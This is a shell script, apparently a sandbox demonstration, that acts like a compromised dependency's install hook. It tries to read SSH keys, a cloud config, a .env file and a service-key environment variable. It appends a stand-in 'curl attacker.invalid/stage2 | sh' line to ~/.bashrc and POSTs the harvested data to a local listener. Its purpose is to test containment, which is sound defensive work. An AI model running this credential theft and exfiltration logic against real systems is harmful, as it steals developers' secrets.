#!/bin/sh
# Simulated malicious install script, as a compromised dependency could ship it.
# It only targets the FAKE demo secrets and a LOCAL listener on 127.0.0.1.
# Each probe prints one line: RESULT|<id>|<leaked|blocked|ok>|<detail>

LOOT=""

probe_read() { # <id> <file>
  if out=$(head -c 60 "$2" 2>&1); then
    if [ -z "$out" ]; then
      echo "RESULT|$1|blocked|reads as an empty file (masked by policy)"
    else
      echo "RESULT|$1|leaked|$(printf '%s' "$out" | head -n 2 | tr '\n' ' ' | cut -c1-44)..."
      LOOT="$LOOT$1: $(printf '%s' "$out" | tr '\n' ' ' | cut -c1-60)
"
    fi
  else
    echo "RESULT|$1|blocked|$(printf '%s' "$out" | sed 's/^.*: //' | head -n 1)"
  fi
}

# 1. Credentials in the home folder and in the project
probe_read ssh "$HOME/.ssh/id_ed25519"
probe_read cf "$HOME/.cf/config.json"
probe_read dotenv "./.env"

# 2. A secret in the developer's shell environment
if [ -n "$AICORE_SERVICE_KEY" ]; then
  echo "RESULT|envvar|leaked|AICORE_SERVICE_KEY=$(printf '%s' "$AICORE_SERVICE_KEY" | cut -c1-28)..."
  LOOT="${LOOT}env: AICORE_SERVICE_KEY=$AICORE_SERVICE_KEY
"
else
  echo "RESULT|envvar|blocked|variable not present in the sandbox"
fi

# 3. Persistence: add a line to the shell profile
if out=$( (echo '# curl -s https://attacker.invalid/stage2 | sh' >> "$HOME/.bashrc") 2>&1 ); then
  echo "RESULT|persist|leaked|line appended to ~/.bashrc"
else
  echo "RESULT|persist|blocked|$(printf '%s' "$out" | sed 's/^.*: //' | head -n 1)"
fi

# 4. The legitimate job: write a build artifact into the project
if out=$( (echo "built at $(date)" > ./build/output.txt) 2>&1 ); then
  echo "RESULT|work|ok|wrote ./build/output.txt"
else
  echo "RESULT|work|blocked|$(printf '%s' "$out" | sed 's/^.*: //' | head -n 1)"
fi

# 5. Exfiltration to the attacker's server (a local listener in this demo)
if [ -z "$LOOT" ]; then LOOT="nothing found"; fi
if out=$(printf '%s' "$LOOT" | curl -sS -m 4 -X POST --data-binary @- "http://127.0.0.1:9999/collect" 2>&1); then
  echo "RESULT|exfil|leaked|$out"
else
  echo "RESULT|exfil|blocked|$(printf '%s' "$out" | sed 's/^curl: ([0-9]*) //' | cut -c1-60)"
fi
